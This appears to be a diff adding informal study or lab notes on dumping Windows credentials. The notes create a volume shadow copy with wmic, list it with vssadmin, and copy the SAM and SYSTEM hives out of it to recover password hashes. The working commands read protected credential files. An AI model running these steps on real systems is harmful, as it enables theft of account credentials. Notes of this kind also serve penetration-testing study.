@@ -1,0 +1,33 @@
+So, this is when we use a built in tool from windows called 
+volume copy shadow service within a COMMAND PROMPT to attempt to copy
+the SAM hashes.
+
+We need a COMMAND PROMPT With ADMINISTRATOR PRIV to do this
+
+Run the standard cmd.exe prompt with administrator privileges.
+Execute the wmic command to create a copy shadow of C: drive
+Verify the creation from step 2 is available.
+Copy the SAM database from the volume we created in step 2
+
+wmic shadowcopy call create Volume='C:\'
+
+after we create it, we can use vssadmin to list and confirm that we have
+a copy of the C drive.
+
+vssadmin list shadows
+
+itll show the successful thing if it was successful, and then itll output
+wherever its stored within this line:
+         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+
+SAM database is usually encrypted with RC4 or AES encryption, so we need
+a key to decrpyt it. the key is stored in the files system in:
+c:\Windows\System32\Config\system
+
+now, we copy both the SAM and the SYSTEM files from the shadowcopy
+we generateed so we can grab this database (copied to desktop):
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
+
+
+
